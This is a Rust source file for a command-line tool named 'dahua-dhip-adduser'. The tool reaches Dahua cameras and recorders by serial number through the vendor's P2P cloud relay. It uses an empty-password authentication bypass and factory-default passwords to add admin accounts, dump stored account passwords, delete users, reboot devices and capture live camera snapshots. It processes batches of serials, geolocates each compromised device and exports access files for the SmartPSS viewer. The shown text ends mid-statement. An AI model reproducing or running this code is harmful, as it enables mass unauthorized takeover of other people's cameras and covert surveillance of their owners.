mod p2p;
mod sdk;

use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use dahua_dhip_adduser::license;
use dahua_dhip_adduser::paths;
use p2p::*;
use serde_json::{json, Value};
use tokio::net::{TcpListener, UdpSocket};
use tokio::sync::Mutex;

#[derive(Parser)]
#[command(
    name = "dahua-dhip-adduser",
    about = "Add a user to Dahua devices via P2P/DHIP"
)]
struct Args {
    #[arg(long, conflicts_with = "serials_file")]
    serial: Option<String>,
    #[arg(short = 'f', long, conflicts_with = "serial")]
    serials_file: Option<String>,
    #[arg(short = 'P', long, default_value_t = 5000)]
    port: u16,
    #[arg(long)]
    relay: bool,
    #[arg(long, default_value = "admin")]
    admin_user: String,
    #[arg(short = 'p', long, default_value = "")]
    admin_pass: String,
    #[arg(short = 'u', long, default_value = "")]
    user: String,
    #[arg(short = 'w', long, default_value = "")]
    password: String,
    #[arg(long)]
    list_users: bool,
    #[arg(
        long,
        help = "Dump the raw Account table (includes the Password field) from each device"
    )]
    dump_account: bool,
    #[arg(
        long,
        help = "Delete the user with the given numeric Id from each device"
    )]
    delete_user: Option<u32>,
    #[arg(long, help = "Delete the user with the given Name from each device")]
    delete_user_name: Option<String>,
    #[arg(long, help = "Delete ALL users from each device except the admin user")]
    delete_all: bool,
    #[arg(long, default_value = "")]
    memo: String,
    #[arg(
        long,
        default_value = "admin",
        help = "User group: 'admin' (all permissions) or 'user' (monitor+playback on all channels)"
    )]
    group: String,
    #[arg(short, long)]
    verbose: bool,
    #[arg(
        long,
        help = "Use HTTP/RPC2 protocol (port 80) instead of DHIP (port 5000)"
    )]
    http: bool,
    #[arg(
        long,
        help = "Try common factory default admin passwords before the bypass"
    )]
    try_defaults: bool,
    #[arg(
        long,
        default_value = "",
        help = "Override the ok log path (default: log/ok<stem>.log)"
    )]
    ok_file: String,
    #[arg(
        long,
        default_value = "",
        help = "Override the nok log path (default: log/nok<stem>.log)"
    )]
    nok_file: String,
    #[arg(long, help = "Skip SmartPSS XML generation")]
    no_xml: bool,
    #[arg(
        long,
        help = "Reboot each device (magicBox.reboot over the DHIP channel)"
    )]
    reboot: bool,
    #[arg(
        long,
        help = "Check the P2P/cloud state of each device (account, status, public availability)"
    )]
    check_p2p: bool,
    #[arg(
        long,
        help = "Capture a live JPG snapshot of every active camera channel from each device (auto-discovers channels). Uses --user/--password as the camera stream credentials in the snapshot CGI query string."
    )]
    snapshot: bool,
    #[arg(
        long,
        help = "When snapshot fails via P2P tunnel, retry via direct HTTP to the device's public IP (port 80)"
    )]
    direct_http: bool,
    #[arg(
        long,
        help = "When snapshot fails via HTTP, retry via RTSP to the device's public IP (port 554, MJPEG only)"
    )]
    rtsp: bool,
    #[arg(
        long,
        default_value_t = 0,
        help = "Network timeout in seconds for the P2P channel wait, PTCP bind, DHIP and HTTP calls (0 = built-in defaults: 10s challenge/login, 15s list/delete)"
    )]
    timeout: u64,
    #[arg(
        long,
        default_value = "",
        help = "Override the P2P main server (default: www.easy4ipcloud.com:8800 round-robin). Use for cross-region devices, e.g. --main-server 165.154.165.42:8800"
    )]
    main_server: String,
    #[arg(
        long,
        default_value = "",
        help = "Override the relay server for the device tunnel (default: the address from /online/relay). Use for cross-region devices the default relay cannot reach, e.g. --relay-server 148.153.240.184:8900"
    )]
    relay_server: String,
    #[arg(
        long,
        default_value = "",
        help = "Override the agent server from /relay/agent (default: the agent the relay returns). Use when the device only answers on its specific/home agent instance, e.g. --agent-server 148.153.221.60:27052"
    )]
    agent_server: String,
    #[arg(
        long,
        help = "Diagnostic: run the binary SDK (37777/A0) login through the tunnel on each device and report serial/model/channels. Bypasses the DHIP JSON challenge."
    )]
    sdk_test: bool,
}

impl Args {
    /// Network timeout: `--timeout` when set (>0), otherwise the per-call default.
    fn timeout_or(&self, default_secs: u64) -> Duration {
        if self.timeout > 0 {
            Duration::from_secs(self.timeout)
        } else {
            Duration::from_secs(default_secs)
        }
    }
}

fn license_status_reason(st: &license::LicenseStatus) -> String {
    match st {
        license::LicenseStatus::Missing => "file licence.lic non trovato".into(),
        license::LicenseStatus::Empty => "file licence.lic vuoto".into(),
        license::LicenseStatus::Invalid(r) => format!("file licenza non valido: {}", r),
        license::LicenseStatus::Valid => "".into(),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    HTTP_DEBUG.store(args.verbose, Ordering::Relaxed);
    let probe_timeout = args.timeout_or(10);

    match license::check_license() {
        license::LicenseStatus::Valid => {}
        st => {
            eprintln!("[licenza] Bloccato: {}", license_status_reason(&st));
            eprintln!("[licenza] ID macchina: {}", license::machine_id());
            eprintln!(
                "[licenza] Per attivare: genera una licenza con 'license-gen' e crea il file \
                 licence.lic accanto a questo eseguibile."
            );
            std::process::exit(1);
        }
    }

    // Original SmartPSS `name` per serial, quando l'input è un file XML SmartPSS.
    // Viene riusato nel file XML generato così il name resta identico all'origine.
    let mut serial_names: std::collections::HashMap<String, String> =
        std::collections::HashMap::new();

    let serials: Vec<String> = if let Some(ref path) = args.serials_file {
        match dahua_dhip_adduser::serials::parse_serials_file_with_names(path) {
            Ok(p) => {
                for (serial, name) in p.serials.iter().zip(p.names.iter()) {
                    if !name.is_empty() {
                        serial_names.insert(serial.clone(), name.clone());
                    }
                }
                p.serials
            }
            Err(e) => {
                eprintln!("[-] Failed to read serials file '{}': {}", path, e);
                std::process::exit(1);
            }
        }
    } else if let Some(ref s) = args.serial {
        s.split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect()
    } else {
        eprintln!("[--serial | -f] specify --serial or -f <file>");
        std::process::exit(1);
    };

    if args.sdk_test {
        return sdk_test_devices(&serials, &args, probe_timeout).await;
    }

    if args.list_users || args.dump_account {
        return list_users(&serials, &args, probe_timeout).await;
    }

    if let Some(id) = args.delete_user {
        return delete_users(&serials, Some(id), None, &args, probe_timeout).await;
    }

    if let Some(name) = &args.delete_user_name {
        return delete_users(&serials, None, Some(name.clone()), &args, probe_timeout).await;
    }

    if args.delete_all {
        return delete_all_devices(&serials, &args, probe_timeout).await;
    }

    if args.reboot {
        return reboot_devices(&serials, &args, probe_timeout).await;
    }

    if args.check_p2p {
        check_p2p_devices(&serials, &args, probe_timeout).await?;
        if args.snapshot {
            snapshot_devices(&serials, &args, probe_timeout).await?;
        }
        return Ok(());
    }

    if args.user.is_empty() || args.password.is_empty() {
        eprintln!("[-] --user (-u) and --password (-w) are required");
        std::process::exit(1);
    }

    println!("[*] {} serial(s) to process", serials.len());

    let mut ok_count = 0u32;
    let mut fail_count = 0u32;
    let mut ok_serials: Vec<String> = Vec::new();
    let mut ok_serials_raw: Vec<String> = Vec::new();
    let mut nok_serials: Vec<String> = Vec::new();

    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        match try_add_user(serial, &args, probe_timeout).await {
            Ok(geo) => {
                println!("[+] {} \u{2192} OK", serial);
                ok_count += 1;
                ok_serials_raw.push(serial.clone());
                let geo = geo.unwrap_or_default();
                ok_serials.push(format!(
                    "{}_{}_{}_{}_{}",
                    geo.country_code, serial, args.user, args.password, geo.city
                ));
            }
            Err(e) => {
                println!("[-] {} \u{2192} FAIL: {}", serial, e);
                fail_count += 1;
                nok_serials.push(format!("{}: {}", serial, e));
            }
        }
    }

    // Log names follow the input that drove the run: a serials file gives
    // log/ok<stem>.log, a bare --serial gives log/ok<serial>.log. An explicit
    // --ok-file/--nok-file still wins, so the GUI can pin the paths.
    let (derived_ok, derived_nok) =
        paths::log_files(args.serials_file.as_deref(), args.serial.as_deref());
    let ok_path = if args.ok_file.trim().is_empty() {
        derived_ok
    } else {
        args.ok_file.clone()
    };
    let nok_path = if args.nok_file.trim().is_empty() {
        derived_nok
    } else {
        args.nok_file.clone()
    };

    for p in [&ok_path, &nok_path] {
        if let Err(e) = paths::ensure_parent_dir(p) {
            eprintln!("[-] cannot create the folder for '{}': {}", p, e);
        }
    }
    std::fs::write(&ok_path, ok_serials.join("\n")).ok();
    std::fs::write(&nok_path, nok_serials.join("\n")).ok();

    if !ok_serials.is_empty() && !args.no_xml {
        let now: chrono::DateTime<chrono::Local> = chrono::Local::now();
        let file_name = format!(
            "{:04}{:02}{:02}-{:02}{:02}{:02}.xml",
            now.year(),
            now.month(),
            now.day(),
            now.hour(),
            now.minute(),
            now.second()
        );
        let xml_name = paths::xml_file(&file_name);
        if let Err(e) = paths::ensure_parent_dir(&xml_name) {
            eprintln!("[-] cannot create the XML folder: {}", e);
        }
        match generate_smartpss_from_ok(&ok_serials, &xml_name, &serial_names) {
            Ok(()) => println!("[*] SmartPSS XML saved to {}", xml_name),
            Err(e) => eprintln!("[-] SmartPSS XML generation failed: {}", e),
        }
    }

    println!("\n========================================");
    println!(
        "[*] DONE \u{2014} {} OK, {} FAIL out of {}",
        ok_count,
        fail_count,
        serials.len()
    );
    if !ok_serials.is_empty() {
        println!("[*] OK serials saved to {}", ok_path);
    }
    if !nok_serials.is_empty() {
        println!("[*] NOK serials saved to {}", nok_path);
    }

    if args.snapshot {
        if ok_serials_raw.is_empty() {
            eprintln!("[*] snapshot skipped: addUser failed on all serials");
        } else {
            snapshot_devices(&ok_serials_raw, &args, probe_timeout).await?;
        }
    }

    Ok(())
}

/// Diagnostic: open the tunnel and run the binary SDK (A0, port 37777) login
/// on each device, reporting serial/model/channels. Unlike the normal flows it
/// does NOT need the DHIP JSON challenge to succeed, so it tells whether the
/// tunnel carries data and whether the device speaks the A0/SDK dialect.
async fn sdk_test_devices(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {} — SDK test", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };
        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        let mut creds: Vec<(String, String, String)> = Vec::new();
        for (quser, qpass) in [
            (args.admin_user.clone(), args.admin_pass.clone()),
            (args.user.clone(), args.password.clone()),
        ] {
            if !quser.is_empty() && !qpass.is_empty() {
                creds.push((String::new(), quser, qpass));
            }
        }
        if args.try_defaults {
            for pw in DEFAULT_ADMIN_PASSWORDS {
                if args.admin_user.is_empty() || args.admin_pass == *pw {
                    continue;
                }
                creds.push((
                    "default".to_string(),
                    args.admin_user.clone(),
                    (*pw).to_string(),
                ));
            }
        }
        if args.admin_pass.is_empty() && args.password.is_empty() {
            creds.push((String::new(), "admin".to_string(), String::new()));
        }
        if creds.is_empty() {
            creds.push((String::new(), "admin".to_string(), String::new()));
        }

        let mut done = false;
        for (label, quser, qpass) in creds {
            let tag = if label.is_empty() {
                quser.clone()
            } else {
                label
            };
            if args.verbose {
                eprintln!("  [debug] sdk-test creds: {}", tag);
            }
            let client = sdk::SdkClient::new(&quser, &qpass).with_verbose(args.verbose);
            match client.get_device_info(sock, pcp_session).await {
                sdk::SdkInfo::Channels {
                    serial: s,
                    model,
                    channels,
                } => {
                    println!(
                        "[+] SDK OK on {}: serial={} model={} channels={}",
                        tag, s, model, channels
                    );
                    done = true;
                    break;
                }
                sdk::SdkInfo::BindFailed => {
                    eprintln!("  [-] SDK bind on 37777 failed (tunnel not carrying the bind)");
                }
                sdk::SdkInfo::AuthRejected(e) => {
                    eprintln!("  [-] SDK login {} rejected: {}", tag, e.describe());
                    if e.should_abort() {
                        eprintln!("  [-] aborting further SDK logins (would lock the account)");
                        break;
                    }
                }
            }
        }
        if !done {
            eprintln!("  [-] {} → SDK TEST FAIL", serial);
        }
    }
    Ok(())
}

/// List users on each device via DHIP getUserList.
/// P2P handshake with automatic retries (some devices/relays are flaky and
/// time out on the first attempts).
async fn p2p_handshake_retry(
    serial: &str,
    args: &Args,
    verbose: bool,
) -> Result<HandshakeResult, String> {
    let attempts = 3;
    let mut last_err = String::from("unknown error");
    for attempt in 1..=attempts {
        match p2p_handshake(
            serial,
            &args.main_server,
            args.relay,
            &args.admin_user,
            &args.admin_pass,
            args.try_defaults,
            args.timeout_or(15),
            if args.relay_server.is_empty() {
                None
            } else {
                Some(args.relay_server.as_str())
            },
            if args.agent_server.is_empty() {
                None
            } else {
                Some(args.agent_server.as_str())
            },
        )
        .await
        {
            Ok(hr) => return Ok(hr),
            Err(e) => {
                last_err = e;
                if attempt < attempts {
                    if verbose {
                        eprintln!(
                            "[debug] P2P handshake attempt {} failed ({}), retrying...",
                            attempt, last_err
                        );
                    }
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }
            }
        }
    }
    Err(last_err)
}

async fn list_users(
    serials: &[String],
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), Box<dyn std::error::Error>> {
    for (i, serial) in serials.iter().enumerate() {
        println!("\n========================================");
        println!("[{}/{}] {}", i + 1, serials.len(), serial);
        println!("========================================");

        let hr = match p2p_handshake_retry(serial, args, args.verbose).await {
            Ok(h) => h,
            Err(e) => {
                eprintln!("  [-] P2P handshake failed: {}", e);
                continue;
            }
        };

        let (sock, pcp_session) = if args.relay {
            (&hr.agent_socket, &hr.agent_session)
        } else {
            (&hr.device_socket, &hr.device_session)
        };

        if args.dump_account {
            let result = http_list_users(
                sock,
                pcp_session,
                args.timeout_or(15),
                args.verbose,
                true,
                &args.admin_user,
                &args.admin_pass,
            )
            .await;
            if let Err(e) = result {
                eprintln!("  [-] Failed to dump Account table: {}", e);
            }
            continue;
        }

        // Try DHIP list first (reuse the port-5000 session from the challenge).
        // On some devices the port-5000 bind only works before an HTTP port-80 session.
        match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
            Some(ch) => {
                let realm_id = ch.realm_id;
                if args.verbose {
                    eprintln!("[debug] DHIP realm: {:?}", ch.realm);
                }
                let dhip_result =
                    dhip_list_users(sock, pcp_session, &ch, args, probe_timeout).await;
                match dhip_result {
                    Ok(()) => {}
                    Err(e) => {
                        ptcp_disconnect(sock, pcp_session, realm_id).await;
                        if args.verbose {
                            eprintln!("[debug] DHIP list failed ({}), trying HTTP", e);
                        }
                        let result = http_list_users(
                            sock,
                            pcp_session,
                            args.timeout_or(15),
                            args.verbose,
                            false,
                            &args.admin_user,
                            &args.admin_pass,
                        )
                        .await;
                        if let Err(e2) = result {
                            if args.verbose {
                                eprintln!("[debug] HTTP list failed: {}", e2);
                            }
                            eprintln!("  [-] Failed to list users");
                        }
                    }
                }
            }
            None => {
                eprintln!("  [-] DHIP challenge failed");
            }
        }
    }
    Ok(())
}

/// Print a user row as `Id<TAB>Name<TAB>Group<TAB>Password`.
fn print_user_row(user: &Value) {
    let id = user.get("Id").and_then(|i| i.as_i64()).unwrap_or(-1);
    let name = user.get("Name").and_then(|n| n.as_str()).unwrap_or("?");
    let group = user.get("Group").and_then(|g| g.as_str()).unwrap_or("?");
    let pass = user
        .get("Password")
        .and_then(|p| p.as_str())
        .unwrap_or("null");
    println!("  {}\t{}\t{}\t{}", id, name, group, pass);
}

/// Retry PTCP bind a few times (some devices reject a new bind right after a session).
async fn ptcp_bind_retry(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    bind_timeout: Duration,
    verbose: bool,
) -> Option<u32> {
    for attempt in 1..=3 {
        if let Some(id) = ptcp_bind(sock, pcp_session, port, bind_timeout).await {
            return Some(id);
        }
        if verbose {
            eprintln!(
                "[debug] PTCP bind port {} attempt {} failed, retrying...",
                port, attempt
            );
        }
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    None
}

/// List users via HTTP/RPC2 (try port 80, then 5000).
async fn http_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    for &port in &[80u16, 5000] {
        if verbose {
            eprintln!("[debug] http_list_users: trying port {}", port);
        }
        let result = http_list_users_on_port(
            sock,
            pcp_session,
            port,
            timeout,
            verbose,
            dump_account,
            admin_user,
            admin_pass,
        )
        .await;
        match result {
            Ok(()) => return Ok(()),
            Err(e) => {
                if verbose {
                    eprintln!("[debug] http_list_users: port {} failed: {}", port, e);
                }
            }
        }
    }
    Err("HTTP list users failed on all ports".into())
}

/// HTTP list users on a specific port. Uses "admin" as default admin user.
/// HTTP list users on a specific port.
async fn http_list_users_on_port(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    port: u16,
    timeout: Duration,
    verbose: bool,
    dump_account: bool,
    admin_user: &str,
    admin_pass: &str,
) -> Result<(), String> {
    if verbose {
        eprintln!("[debug] http_list_users_on_port: trying port {}", port);
    }
    let bind_timeout = timeout;
    let realm_id = match ptcp_bind_retry(sock, pcp_session, port, bind_timeout, verbose).await {
        Some(id) => id,
        None => return Err(format!("PTCP bind failed on port {}", port)),
    };
    let host = format!("127.0.0.1:{}", port);

    // Login challenge
    let login1 = json!({"method": "global.login", "params": {
        "userName": admin_user, "password": "", "clientType": "Web3.0", "loginType": "Direct",
    }, "id": 10000});

    let resp1 = match http_call(
        sock,
        pcp_session,
        realm_id,
        &host,
        "/RPC2_Login",
        &login1.to_string(),
        timeout,
        "",
    )
    .await
    {
        Some(r) => r,
        None => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err("HTTP login challenge timeout".into());
        }
    };

    let resp1_body = match http_extract_body(&resp1) {
        Some(b) => b,
        None => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err("No body in challenge response".into());
        }
    };

    let val1 = match serde_json::from_str::<Value>(resp1_body) {
        Ok(v) => v,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, realm_id).await;
            return Err(format!("bad JSON: {}", e));
        }
    };

    let session = val1
        .get("session")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let realm = val1
        .get("params")
        .and_then(|p| p.get("realm"))
        .and_then(|v| v.as_str())
        .unwrap_or("Login");
    let random = val1
        .get("params")
        .and_then(|p| p.get("random"))
        .and_then(|v| v.as_str())
        .unwrap_or("");

    // Login: try real credentials first (if --admin-pass given), then bypass
    let mut login_ok = false;
    if !admin_pass.is_empty() {
        let pw_hash = password_hash(admin_user, realm, random, admin_pass);
        let login2 = json!({"method": "global.login", "session": &session, "params": {
            "userName": admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
            "loginType": "Loopback", "clientType": "Local", "authorityType": "Default",
            "passwordType": "Default",
        }, "id": 10001});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2_Login",
            &login2.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if verbose {
                            eprintln!("[debug] HTTP login via password");
                        }
                        login_ok = true;
                    }
                }
            }
        }
    }
    if !login_ok {
        let hash = empty_password_hash(admin_user, realm, random);
        for (login_type, client_type) in &[("Loopback", "Local"), ("Direct", "NetKeyboard")] {
            let login2 = json!({"method": "global.login", "session": &session, "params": {
                "userName": admin_user, "password": hash, "ipAddr": "127.0.0.1",
                "loginType": login_type, "clientType": client_type, "authorityType": "Default",
                "passwordType": "Default",
            }, "id": 10001});
            if let Some(t) = http_call(
                sock,
                pcp_session,
                realm_id,
                &host,
                "/RPC2_Login",
                &login2.to_string(),
                timeout,
                &session,
            )
            .await
            {
                if let Some(b) = http_extract_body(&t) {
                    if let Ok(v) = serde_json::from_str::<Value>(b) {
                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                            login_ok = true;
                            break;
                        }
                    }
                }
            }
        }
    }

    if !login_ok {
        ptcp_disconnect(sock, pcp_session, realm_id).await;
        return Err("bypass login failed".into());
    }

    // Try multiple methods to list users
    let mut found = false;
    let queries: &[(&str, serde_json::Value)] = if dump_account {
        &[
            ("configManager.getConfig", json!({"name": "Account"})),
            ("userManager.getUserInfoAll", json!({})),
        ]
    } else {
        &[
            ("userManager.getUserInfoAll", json!({})),
            ("userManager.getUserList", json!({})),
            ("configManager.getConfig", json!({"name": "Account"})),
            ("configManager.getConfig", json!({"name": "UserManager"})),
            ("configManager.getConfig", json!({"name": "User"})),
            ("configManager.getConfig", json!({"name": "user"})),
        ]
    };
    for (method, params) in queries {
        let body = json!({"method": method, "session": &session,
            "params": params, "id": 102});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2",
            &body.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if verbose {
                    eprintln!("[debug] {} response: {}", method, b);
                }
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    let users = if *method == "configManager.getConfig" {
                        v.get("params")
                            .and_then(|p| p.get("table"))
                            .and_then(|t| t.get("User"))
                            .and_then(|u| u.as_array())
                    } else {
                        v.get("params")
                            .and_then(|p| p.get("users"))
                            .and_then(|u| u.as_array())
                            .or_else(|| v.get("params").and_then(|p| p.as_array()))
                    };
                    if let Some(arr) = users {
                        if !arr.is_empty() {
                            for (_idx, user) in arr.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                            break;
                        }
                    } else if verbose {
                        let err = v
                            .get("error")
                            .and_then(|e| e.get("message"))
                            .and_then(|m| m.as_str())
                            .unwrap_or("no users array / no error field");
                        eprintln!("[debug] {}: no users array ({})", method, err);
                    }
                }
            }
        } else if last_call_disc() {
            if verbose {
                eprintln!(
                    "[debug] {}: device sent DISC — channel dead, aborting",
                    method
                );
            }
            break;
        } else if verbose {
            eprintln!("[debug] {}: http_call returned None (timeout)", method);
        }
    }
    // Also try userManager.getUser with empty name (some firmwares return all)
    if !found && !last_call_disc() {
        let body = json!({"method": "userManager.getUser", "session": &session,
            "params": {"Name": ""}, "id": 103});
        if let Some(t) = http_call(
            sock,
            pcp_session,
            realm_id,
            &host,
            "/RPC2",
            &body.to_string(),
            timeout,
            &session,
        )
        .await
        {
            if let Some(b) = http_extract_body(&t) {
                if let Ok(v) = serde_json::from_str::<Value>(b) {
                    eprintln!("[debug] getUser response: {}", v);
                    if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
                        if let Some(params) = v.get("params").and_then(|p| p.as_array()) {
                            for (_idx, user) in params.iter().enumerate() {
                                print_user_row(user);
                                found = true;
                            }
                        }
                    }
                }
            }
        }
    }
    let result = if found {
        Ok(())
    } else {
        Err("no user list methods returned data".into())
    };

    let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
    ptcp_disconnect(sock, pcp_session, realm_id).await;
    result
}

/// Bypass login and list users via DHIP on an already-bound session.
async fn dhip_list_users(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };
    let timeout = args.timeout_or(5);
    let (users, listed) = dhip_list_all_users(
        sock,
        pcp_session,
        &ctx.dhip,
        ctx.session_id,
        timeout,
        args.verbose,
    )
    .await;
    for user in &users {
        print_user_row(user);
    }
    let _ = dhip_call(sock, pcp_session, &ctx.dhip,
        &json!({"id":99,"magic":"0x1234","method":"global.logout","params":"null","session":ctx.session_id}).to_string(),
        probe_timeout).await;
    ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
    if !listed {
        return Err("device did not return any users".into());
    }
    Ok(())
}

/// Info captured from the DHIP global.login challenge, together with the live
/// PTCP channel it came on. The channel is kept open so login/addUser can run
/// on the same session — many devices accept only ONE bound channel and refuse
/// any re-bind (e.g. 2L05BD6PAZ00030).
#[derive(Debug, Clone)]
struct DhipChallengeInfo {
    realm_id: u32,
    port: u16,
    realm: String,
    random: String,
    session_id: u32,
}

async fn try_add_user(
    serial: &str,
    args: &Args,
    probe_timeout: Duration,
) -> Result<Option<dahua_dhip_adduser::geo::GeoInfo>, String> {
    let hr = p2p_handshake_retry(serial, args, args.verbose)
        .await
        .map_err(|e| format!("P2P handshake failed: {}", e))?;
    let device_ip = hr.device_public_ip.clone();

    let (sock, pcp_session) = if args.relay {
        (&hr.agent_socket, &hr.agent_session)
    } else {
        (&hr.device_socket, &hr.device_session)
    };

    // Step 1: DHIP login challenge to get the realm (SmartPSS uses this realm).
    // The bound channel stays open and is reused for the DHIP add below.
    // Some firmware (e.g. China-market devp2p 6.7.5) never answers the JSON
    // `global.login` on any port (they speak the A0/SDK dialect instead): the
    // challenge returns None there, and we fall straight through to the
    // HTTP/RPC2 fallback below instead of aborting.
    let chal = dhp_challenge(sock, pcp_session, args, probe_timeout).await;
    let chal_realm = chal.as_ref().map(|c| c.realm.clone()).unwrap_or_default();
    // Prefer the device's real HTTP port (decrypted from `/info/device` during the
    // handshake); when a DHIP session is up it is refined below via InetWeb. Without
    // this, firmware that never answers DHIP `global.login` (challenge `None`) falls
    // back to binding ports 80/5000, which such devices answer with CONN+DISC, so
    // `/RPC2_Login` never gets a reply and the add fails with "login challenge timeout".
    let mut device_http_port: Option<u16> = hr.device_http_port;

    if let Some(chal_ref) = chal.as_ref() {
        if args.verbose {
            eprintln!(
                "[debug] DHIP realm: {:?} (port {})",
                chal_realm, chal_ref.port
            );
        }

        // Primary: addUser over DHIP directly on the live challenge channel.
        // `device_http_port` gets the device's real HTTP port (InetWeb) when the
        // session could be established, so the HTTP fallback binds the right port.
        if dhip_add_on_challenge(
            sock,
            pcp_session,
            chal_ref,
            args,
            probe_timeout,
            &mut device_http_port,
        )
        .await
        .is_ok()
        {
            return Ok(resolve_geo(&device_ip).await);
        }
    }

    let mut last_err = if chal.is_some() {
        "DHIP addUser failed".to_string()
    } else {
        "DHIP challenge failed (no realm)".to_string()
    };

    // The device never answered DHIP `global.login` on any port: it most likely
    // speaks the old-style DVRIP binary dialect (SDK port 37777). Try addUser
    // there before falling back to HTTP/RPC2.
    if chal.is_none() {
        match sdk_dvrip_add_user(sock, pcp_session, args).await {
            Ok(()) => return Ok(resolve_geo(&device_ip).await),
            Err(e) => {
                if args.verbose {
                    eprintln!("[debug] SDK/DVRIP addUser failed: {}", e);
                }
                last_err = e;
            }
        }
    }

    // Il canale del challenge è probabilmente morto dopo il fallimento DHIP (alcuni
    // device accettano un solo canale PTCP e rifiutano il re-bind sulla stessa porta,
    // es. `PTCP bind failed on port 5000`). Nuovo handshake P2P fresco prima dei
    // tentativi HTTP, come già fatto per il flusso delete.
    let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
        Ok(h) => h,
        Err(e) => {
            eprintln!("  [-] P2P re-handshake for HTTP fallback failed: {}", e);
            return Err(format!("{}; plus P2P re-handshake failed: {}", last_err, e));
        }
    };
    let (sock2, pcp_session2) = if args.relay {
        (&hr2.agent_socket, &hr2.agent_session)
    } else {
        (&hr2.device_socket, &hr2.device_session)
    };

    // Fallback: HTTP/RPC2 on fresh sockets. The device's real HTTP port (decrypted
    // from `/info/device` at handshake time, or read from InetWeb while the DHIP
    // session was live) comes first; 80/5000 stay as guesses for when neither
    // source exposed it.
    if device_http_port.is_none() {
        device_http_port = hr2.device_http_port;
    }
    let mut ports: Vec<u16> = Vec::new();
    if let Some(p) = device_http_port {
        ports.push(p);
    }
    for p in [80u16, 5000] {
        if !ports.contains(&p) {
            ports.push(p);
        }
    }
    if args.verbose {
        eprintln!("[debug] HTTP fallback ports: {:?}", ports);
    }
    for &port in &ports {
        let result =
            http_try_add_user(sock2, pcp_session2, &chal_realm, port, args, probe_timeout).await;
        match result {
            Ok(()) => return Ok(resolve_geo(&device_ip).await),
            Err(e) => {
                last_err = e;
                if port == ports[ports.len() - 1] {
                    break;
                }
                if args.verbose {
                    eprintln!(
                        "[debug] HTTP on port {} failed ({}), trying next port...",
                        port, last_err
                    );
                }
            }
        }
    }
    Err(last_err)
}

/// Resolve the device public IP to a country code + city (None on failure).
async fn resolve_geo(device_ip: &str) -> Option<dahua_dhip_adduser::geo::GeoInfo> {
    if device_ip.is_empty() {
        return None;
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] resolving geo for public IP {}", device_ip);
    }
    dahua_dhip_adduser::geo::lookup(device_ip).await
}

/// Add user via DHIP binary protocol on the LIVE channel of an existing
/// challenge (`chal`). No re-bind: devices that accept a single bound channel
/// refuse any later bind, so login+addUser must reuse the challenge session.
async fn dhip_add_on_challenge(
    sock: &UdpSocket,
    pcp_session: &Mutex<PTCPSession>,
    chal: &DhipChallengeInfo,
    args: &Args,
    probe_timeout: Duration,
    http_port_out: &mut Option<u16>,
) -> Result<(), String> {
    let ctx = match dhip_established_session(sock, pcp_session, chal, args, probe_timeout).await {
        Ok(c) => c,
        Err(e) => {
            ptcp_disconnect(sock, pcp_session, chal.realm_id).await;
            return Err(e);
        }
    };

    // Read the device's real HTTP port while the session is still live: the
    // HTTP fallback below must bind that port instead of guessing 80/5000.
    let ports = query_network_ports(
        sock,
        pcp_session,
        &ctx.dhip,
        ctx.session_id,
        probe_timeout,
        args.verbose,
    )
    .await;
    if let Some(p) = ports.http {
        *http_port_out = Some(p);
    }

    // DHIP addUser with HA1 hash (MD5(user:realm:password)) so SmartPSS can authenticate
    let pw_hash = http_adduser_password_hash(&args.user, &chal.realm, &args.password);
    let result =
